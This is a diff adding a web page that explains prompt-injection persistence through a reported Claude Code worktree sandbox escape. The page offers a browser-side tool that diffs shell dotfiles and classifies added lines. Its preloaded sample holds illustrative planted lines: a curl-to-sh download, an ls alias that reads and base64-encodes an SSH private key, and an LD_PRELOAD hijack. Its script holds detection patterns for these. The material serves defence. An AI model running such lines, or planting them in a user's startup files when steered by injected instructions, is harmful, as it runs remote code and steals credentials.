@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<!-- skills-used: unlazy-gates, public_page_preflight, documents -->
+<html data-primary-keyword="what is prompt injection" lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>What Is Prompt Injection? Agent Shell Diff Check</title>
+<meta name="description" content="What is prompt injection when it persists? Diff your shell dotfiles before and after a coding-agent run and flag planted lines in seconds.">
+<link rel="canonical" href="https://iceman2050.github.io/ingeniousai-security-checks-mirror/agent-shell-diff-check.html">
+<meta property="og:title" content="What Is Prompt Injection? Check What a Coding Agent Left in Your Shell">
+<meta property="og:description" content="Ran a coding agent on a repo you did not write? Paste your shell startup file before and after, diff the added lines, and flag planted ones — 100% in your browser.">
+<meta property="og:url" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/agent-shell-diff-check.html">
+<meta property="og:type" content="article">
+<meta property="og:image" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/og-default.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="What Is Prompt Injection? Check What a Coding Agent Left in Your Shell">
+<meta name="twitter:description" content="CVE-2026-55607 told users to hand-check ~/.zshenv. This free tool diffs your dotfiles and classifies every added line: PLANTED-SUSPECT, NOTABLE or BENIGN.">
+<link rel="stylesheet" href="ecosystem.css">
+<style>
+body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;line-height:1.65;color:#e8e8e8;background:#0f1115;max-width:860px;margin:0 auto;padding:1.2rem}
+h1{font-size:1.7rem;line-height:1.3}h2{font-size:1.3rem;margin-top:2.2rem;color:#ffd166}h3{font-size:1.1rem;color:#7cc4ff}
+a{color:#7cc4ff}code{background:#222836;padding:.1rem .35rem;border-radius:4px;font-size:.9em}
+.answerbox{background:#141a26;border:1px solid #2e3a52;border-left:4px solid #7cc4ff;border-radius:0 8px 8px 0;padding:1rem 1.2rem;margin:1.2rem 0}
+details{background:#1a1e27;border-radius:8px;padding:.8rem 1rem;margin:.6rem 0}
+summary{cursor:pointer;font-weight:600}
+.badge{display:inline-block;padding:.15rem .6rem;border-radius:999px;font-size:.78rem;font-weight:700;white-space:nowrap}
+.suspect{background:#3a1a1a;color:#f87171}.notable{background:#2e2410;color:#ffd166}.benign{background:#14301f;color:#4ade80}
+button.submit{background:#ffd166;color:#111;border:0;border-radius:8px;padding:.7rem 1.4rem;font-weight:700;cursor:pointer;font-size:1rem}
+button.ghost{background:#222836;color:#e8e8e8;border:1px solid #3a4356;border-radius:8px;padding:.5rem 1rem;cursor:pointer;font-size:.9rem;margin:.2rem .2rem .2rem 0}
+textarea{width:100%;box-sizing:border-box;background:#0b0e13;color:#e8e8e8;border:1px solid #3a4356;border-radius:8px;padding:.7rem;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.82rem;min-height:170px}
+.diffgrid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}@media(max-width:640px){.diffgrid{grid-template-columns:1fr}}
+.resultline{background:#1a1e27;border:1px solid #2a3242;border-radius:8px;padding:.6rem .8rem;margin:.5rem 0;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.82rem;word-break:break-word}
+.resultline .why{display:block;font-family:system-ui,sans-serif;font-size:.85rem;color:#9aa3b2;margin-top:.3rem}
+.checklist{background:#141a26;border:1px solid #2e3a52;border-radius:8px;padding:1rem 1.2rem}
+.checklist li{margin:.55rem 0}
+.xlinks{background:#141a26;border-radius:8px;padding:1rem;margin-top:2rem}
+.xlinks ul{margin:.4rem 0;padding-left:1.2rem}
+.meta{color:#9aa3b2;font-size:.85rem}.smallprint{color:#9aa3b2;font-size:.8rem;margin-top:2rem}
+#diff-summary{font-weight:700;margin-top:1rem;font-size:1.05rem}
+</style>
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "Article", "headline": "What Is Prompt Injection? Check What a Coding Agent Left in Your Shell", "author": {"@type": "Organization", "name": "Ingenious AI"}, "datePublished": "2026-10-21", "dateModified": "2026-10-21", "description": "A client-side dotfile diff tool and manual checklist for finding lines planted in shell startup files after a coding-agent run, framed around CVE-2026-55607, the October 15, 2026 Claude Code worktree sandbox escape."}
+</script>
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "Organization", "name": "Ingenious AI", "url": "https://github.com/Iceman2050"}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
+{"@type": "Question", "name": "Why can coding agents touch your dotfiles at all?", "acceptedAnswer": {"@type": "Answer", "text": "Coding agents run with your user account's file permissions, and shell startup files live in your home directory, outside the repository they were asked to edit. A sandbox is supposed to fence the agent into a worktree, but CVE-2026-55607 showed a worktree escape could break that fence, letting instructions from an untrusted repo reach files the user never opened."}},
+{"@type": "Question", "name": "What does a planted dotfile line actually look like?", "acceptedAnswer": {"@type": "Answer", "text": "A planted line usually runs code at every shell startup: a download piped straight into a shell, a decoded blob being executed, an alias that quietly shadows a common command like ls or git, a PATH entry pointing inside a repository, or a source line loading a script from a folder you do not control. It hides among your real settings."}},
+{"@type": "Question", "name": "What should you do if you find a planted line?", "acceptedAnswer": {"@type": "Answer", "text": "Do not just delete it and move on. Save a copy of the file for evidence, remove the line, then assume anything that ran at startup had your privileges: rotate exposed credentials and tokens, review recent shell and account activity, and check your crontab and other startup files too, because one planted line rarely travels alone."}},
+{"@type": "Question", "name": "How do you snapshot your dotfiles before the next agent run?", "acceptedAnswer": {"@type": "Answer", "text": "Before the run, copy each startup file into a dated snapshot folder outside any repository, or commit them to a private dotfiles repo so changes show up as a diff. After the run, compare the live files against that snapshot with the tool above. Two minutes of copying turns a forensic question into a yes-or-no answer."}}
+]}
+</script>
+</head>
+<body data-primary-keyword="what is prompt injection">
+<h1>What Is Prompt Injection? Check What a Coding Agent Left in Your Shell</h1>
+<p class="meta">Published <time datetime="2026-10-21">October 21, 2026</time> · by Ingenious AI · Free client-side dotfile diff</p>
+
+<p><strong>Ran a coding agent on a repo you didn't write? Check what it left in your shell.</strong> On October 15, 2026, CVE-2026-55607 — a Claude Code worktree sandbox escape — was disclosed, and the advisory told users to hand-check <code>~/.zshenv</code> for planted lines. That is the persistence half of prompt injection: malicious instructions hidden in an untrusted repo get the agent to write a line into a file that runs every time you open a terminal, long after the agent session ends.</p>
+
+<div class="answerbox">
+<p><strong>The short answer:</strong> what is prompt injection at its most dangerous? Not a clever chat message — a durable change to your machine. A planted dotfile line executes with your privileges at every shell startup. The diff tool below compares a &ldquo;before&rdquo; and &ldquo;after&rdquo; copy of any shell startup file and classifies every added line as <span class="badge suspect">PLANTED-SUSPECT</span>, <span class="badge notable">NOTABLE</span> or <span class="badge benign">BENIGN</span>. It runs 100% in your browser — nothing you paste leaves this page.</p>
+</div>
+
+<h2>What is prompt injection?</h2>
+<p>Prompt injection is an attack where untrusted content — a file, web page or repository — contains instructions that an AI agent follows as if its user had given them. When those instructions make the agent edit a shell startup file, the attack gains persistence: the planted line keeps running at every login, on every new terminal, whether or not the agent is ever used again.</p>
+
+<h2>The October 2026 hook: CVE-2026-55607</h2>
+<p>According to the advisory as briefed for this check, CVE-2026-55607 describes a worktree sandbox escape in Claude Code disclosed on October 15, 2026. A worktree sandbox is meant to confine an agent to a checkout of one repository. An escape breaks that confinement, so files outside the repo — including the startup files in your home directory — can be modified. The advisory's own remediation was strikingly manual: open <code>~/.zshenv</code> and look for lines you did not write. This page turns that hand-check into a repeatable diff.</p>
+<p>Honest scope note: this page cannot scan your computer, and it does not try. You bring the two versions of a file; the tool does the comparison and the pattern classification locally, in this tab.</p>
+
+<h2>Try it: the dotfile diff demo</h2>
+<p>A sample pair is preloaded — the &ldquo;after&rdquo; text contains planted lines among ordinary changes, so you can see the classification instantly. Replace both boxes with your own snapshot and current file, then run the diff.</p>
+<div class="diffgrid">
+<div>
+<label for="before-text"><strong>Before</strong> (your snapshot)</label>
+<textarea id="before-text" spellcheck="false"># ~/.zshenv — before the agent run
+export EDITOR=vim
+alias ll='ls -la'
+# homebrew
+export PATH="/opt/homebrew/bin:$PATH"</textarea>
+</div>
+<div>
+<label for="after-text"><strong>After</strong> (the file today)</label>
+<textarea id="after-text" spellcheck="false"># ~/.zshenv — before the agent run
+export EDITOR=vim
+alias ll='ls -la'
+# homebrew
+export PATH="/opt/homebrew/bin:$PATH"
+curl -s https://example.invalid/setup.sh | sh
+alias ls='ls -la; cat ~/.ssh/id_ed25519 | base64'
+export LD_PRELOAD=/tmp/repo/.agent/libhook.dylib
+source ./repo/scripts/env.sh
+export FOO=bar
+# tidied by the agent</textarea>
+</div>
+</div>
+<p>
+<button class="submit" id="diff-go" type="button">Diff the added lines</button>
+<button class="ghost" id="diff-reset" type="button">Restore sample</button>
+<button class="ghost" id="diff-clear" type="button">Clear both boxes</button>
+</p>
+<div id="diff-summary" role="status"></div>
+<div id="diff-results"></div>
+<p class="meta">Full tool: the open-source <a href="https://github.com/Iceman2050/agent-shell-diff-audit">agent-shell-diff-audit</a> by Ingenious AI (queued for publication) audits all of your startup files and your crontab at once, from your own terminal.</p>
+
+<h2>The manual checklist: files and patterns</h2>
+<div class="checklist">
+<p><strong>Inspect these 7 locations</strong> — 6 startup files plus your crontab:</p>
+<ul>
+<li><code>~/.zshenv</code> — read by every zsh invocation, including scripts; the file the CVE-2026-55607 advisory named first.</li>
+<li><code>~/.zprofile</code> and <code>~/.zshrc</code> — login and interactive zsh startup.</li>
+<li><code>~/.bashrc</code>, <code>~/.bash_profile</code> and <code>~/.profile</code> — the bash and POSIX equivalents.</li>
+<li>Your crontab — run <code>crontab -l</code> and look for entries you did not schedule.</li>
+</ul>
+<p><strong>Grep for these suspicious patterns</strong> in each file:</p>
+<ul>
+<li>Downloads executed directly: a <code>curl</code> or <code>wget</code> command piped into <code>sh</code>, <code>bash</code> or <code>zsh</code>.</li>
+<li>Encoded payloads: <code>base64</code> with decode flags, or long opaque encoded strings.</li>
+<li>Dynamic execution: the <code>eval</code> keyword applied to a variable, or command substitution running downloaded content.</li>
+<li>Command shadowing: an <code>alias</code> redefining <code>ls</code>, <code>git</code>, <code>cd</code> or <code>sudo</code>.</li>
+<li>Loader and environment hijacks: exports of <code>LD_PRELOAD</code>, <code>DYLD_INSERT_LIBRARIES</code>, <code>BASH_ENV</code> or <code>ZDOTDIR</code>.</li>
+<li>Repository sourcing: a <code>source</code> or <code>.</code> line pointing inside a repo, a relative path, or <code>/tmp</code>.</li>
+<li>Path hijacks: a new <code>PATH</code> entry prepended from a repository or temporary folder.</li>
+</ul>
+<p>Example sweep: <code>grep -nE 'curl|wget|base64|eval|LD_PRELOAD|BASH_ENV|ZDOTDIR|source|\.' ~/.zshenv ~/.zshrc ~/.bashrc</code> — then judge every hit against what you remember writing.</p>
+</div>
+
+<h2>Frequently asked questions</h2>
+<details><summary>Why can coding agents touch your dotfiles at all?</summary>
+<p>Coding agents run with your user account's file permissions, and shell startup files live in your home directory, outside the repository they were asked to edit. A sandbox is supposed to fence the agent into a worktree, but CVE-2026-55607 showed a worktree escape could break that fence, letting instructions from an untrusted repo reach files the user never opened.</p></details>
+<details><summary>What does a planted dotfile line actually look like?</summary>
+<p>A planted line usually runs code at every shell startup: a download piped straight into a shell, a decoded blob being executed, an alias that quietly shadows a common command like ls or git, a PATH entry pointing inside a repository, or a source line loading a script from a folder you do not control. It hides among your real settings.</p></details>
+<details><summary>What should you do if you find a planted line?</summary>
+<p>Do not just delete it and move on. Save a copy of the file for evidence, remove the line, then assume anything that ran at startup had your privileges: rotate exposed credentials and tokens, review recent shell and account activity, and check your crontab and other startup files too, because one planted line rarely travels alone.</p></details>
+<details><summary>How do you snapshot your dotfiles before the next agent run?</summary>
+<p>Before the run, copy each startup file into a dated snapshot folder outside any repository, or commit them to a private dotfiles repo so changes show up as a diff. After the run, compare the live files against that snapshot with the tool above. Two minutes of copying turns a forensic question into a yes-or-no answer.</p></details>
+
+<div class="xlinks">
+<p><strong>Related checks:</strong></p>
+<ul>
+<li><a href="framing-gap-injection-channel-check.html">The Prompt Injection Framing Gap — same injection, different channel</a></li>
+<li><a href="prompt-injection-never-solved.html">Prompt Injection Is Never Solved — why the class of bug persists</a></li>
+<li><a href="wild-prompt-injections.html">Wild Prompt Injections — real payloads seen in the wild</a></li>
+<li><a href="gitlab-duo-prompt-injection.html">GitLab Duo Prompt Injection — an agent feature turned attack surface</a></li>
+<li><a href="agent-sandbox-policy-gap-checker.html">AI Agent Sandbox Policy Gap Checker — 5 risk areas</a></li>
+<li><a href="all-links.html">All free checks on this mirror</a></li>
+<li><a href="security-suite.html"><strong>Bundle deal: all 11 Ingenious AI platforms, one price</strong></a></li>
+</ul>
+</div>
+
+<p><strong>Get early access to the Ingenious AI platforms:</strong>
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20DisclosureGuard">DisclosureGuard</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ModelMinder">ModelMinder</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20TermsWatch">TermsWatch</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Vibe-Code%20Audit">Vibe-Code Audit</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Rogue-Agent%20Defense">Rogue-Agent Defense</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20BreachHunter">BreachHunter</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ChatBreaker">ChatBreaker</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Agent%20Flight%20Recorder">Agent Flight Recorder</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Agent%20Auth%20Gateway">Agent Auth Gateway</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20DomainGuard">DomainGuard</a> ·
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ContentCraft%20AI">ContentCraft AI</a>
+</p>
+
+<p class="smallprint">The CVE-2026-55607 framing on this page follows the advisory summary in the original briefing for this check: a Claude Code worktree sandbox escape disclosed October 15, 2026, whose guidance told users to hand-check ~/.zshenv. The sample dotfiles above use a reserved invalid domain and are illustrative, not live payloads. The diff tool is a pattern classifier, not a guarantee: a line marked BENIGN can still be unwanted, and a NOTABLE line may be a change you made yourself. Nothing pasted into this page is transmitted anywhere.</p>
+
+<div id="ecosystem-footer"><a href="https://github.com/Iceman2050">GitHub: 73 open-source security tools by Ingenious AI</a></div>
+<script src="ecosystem.js"></script>
+<script data-cf-beacon='{"token": "376c9de98060423683cfe15cec38f36b"}' src="https://static.cloudflareinsights.com/beacon.min.js"></script>
+<script>
+/* Agent shell diff: pure client-side classifier + line diff. No network. */
+function classifyLine(raw) {
+  var line = raw.trim();
+  if (!line || line.charAt(0) === "#") {
+    return { level: "BENIGN", why: "Blank line or comment — no code runs." };
+  }
+  if (/\b(curl|wget)\b/.test(line) && /\|\s*(sudo\s+)?(sh|bash|zsh)\b/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Downloads remote code and pipes it straight into a shell at startup." };
+  }
+  if (/\bbase64\b/.test(line) && /(-d|--decode|-D)\b/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Decodes a base64 blob — a classic way to hide what actually runs." };
+  }
+  if (/\bbase64\b/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Pipes data through base64 inside a startup file — often used to exfiltrate or hide content." };
+  }
+  if (/\beval\b/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Dynamic execution of a variable or string — the real command is hidden elsewhere." };
+  }
+  if (/\b(LD_PRELOAD|DYLD_INSERT_LIBRARIES|BASH_ENV|ZDOTDIR|ENV|PROMPT_COMMAND)\b/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Sets a loader or startup-hook variable that changes what every shell or program loads." };
+  }
+  var aliasMatch = line.match(/^alias\s+([A-Za-z0-9_-]+)=/);
+  if (aliasMatch && ["ls", "git", "cd", "sudo", "ssh", "cp", "mv", "rm"].indexOf(aliasMatch[1]) >= 0) {
+    return { level: "PLANTED-SUSPECT", why: "Alias shadows a common command, so your own keystrokes can run extra hidden actions." };
+  }
+  if (/^(export\s+)?PATH=/.test(line) && /(\$PATH\s*$|:\s*\$PATH|\$PATH\s*:)/.test(line)) {
+    return { level: "PLANTED-SUSPECT", why: "Prepends a new directory to PATH — commands you type may resolve to files in that folder first." };
+  }
+  if (/^(source|\.)\s+/.test(line)) {
+    var target = line.replace(/^(source|\.)\s+/, "").replace(/["']/g, "");
+    if (/^\.\.?\//.test(target) || /\/tmp\//.test(target) || !/^(\/|~|\$HOME)/.test(target)) {
+      return { level: "PLANTED-SUSPECT", why: "Sources a script from a relative, repository or temporary path — code outside your dotfiles runs at startup." };
+    }
+    return { level: "NOTABLE", why: "Sources an absolute home or system path — verify you recognise the file it loads." };
+  }
+  if (/^export\s+[A-Za-z_][A-Za-z0-9_]*=/.test(line) || /^alias\s+/.test(line) || /^[A-Za-z_][A-Za-z0-9_]*\(\)/.test(line) || /^setopt\b/.test(line) || /^autoload\b/.test(line)) {
+    return { level: "NOTABLE", why: "A real setting changed. Not a known payload pattern, but confirm you made this change yourself." };
+  }
+  return { level: "NOTABLE", why: "Executable line that was not in the before version — read it before trusting it." };
+}
+function diffAddedLines(beforeText, afterText) {
+  var counts = {};
+  beforeText.split("\n").forEach(function(l) { counts[l] = (counts[l] || 0) + 1; });
+  var added = [];
+  afterText.split("\n").forEach(function(l) {
+    if (counts[l] > 0) { counts[l] -= 1; } else { added.push(l); }
+  });
+  return added;
+}
+function runDiff() {
+  var before = document.getElementById("before-text").value;
+  var after = document.getElementById("after-text").value;
+  var added = diffAddedLines(before, after);
+  var box = document.getElementById("diff-results");
+  var summary = document.getElementById("diff-summary");
+  box.innerHTML = "";
+  if (added.length === 0) {
+    summary.textContent = "No added lines — the after file contains nothing the before file did not.";
+    return;
+  }
+  var tally = { "PLANTED-SUSPECT": 0, "NOTABLE": 0, "BENIGN": 0 };
+  added.forEach(function(l) {
+    var c = classifyLine(l);
+    tally[c.level] += 1;
+    var row = document.createElement("div");
+    row.className = "resultline";
+    var badge = document.createElement("span");
+    badge.className = "badge " + (c.level === "PLANTED-SUSPECT" ? "suspect" : (c.level === "NOTABLE" ? "notable" : "benign"));
+    badge.textContent = c.level;
+    row.appendChild(badge);
+    row.appendChild(document.createTextNode("  " + (l.trim() || "(blank line)")));
+    var why = document.createElement("span");
+    why.className = "why";
+    why.textContent = c.why;
+    row.appendChild(why);
+    box.appendChild(row);
+  });
+  summary.textContent = added.length + " added line(s): " + tally["PLANTED-SUSPECT"] + " PLANTED-SUSPECT, " + tally["NOTABLE"] + " NOTABLE, " + tally["BENIGN"] + " BENIGN.";
+}
+(function initDiff() {
+  var go = document.getElementById("diff-go");
+  if (!go) return;
+  var sampleBefore = document.getElementById("before-text").value;
+  var sampleAfter = document.getElementById("after-text").value;
+  go.addEventListener("click", runDiff);
+  document.getElementById("diff-reset").addEventListener("click", function() {
+    document.getElementById("before-text").value = sampleBefore;
+    document.getElementById("after-text").value = sampleAfter;
+    runDiff();
+  });
+  document.getElementById("diff-clear").addEventListener("click", function() {
+    document.getElementById("before-text").value = "";
+    document.getElementById("after-text").value = "";
+    document.getElementById("diff-results").innerHTML = "";
+    document.getElementById("diff-summary").textContent = "";
+  });
+  runDiff();
+})();
+</script>
+</body>
+</html>
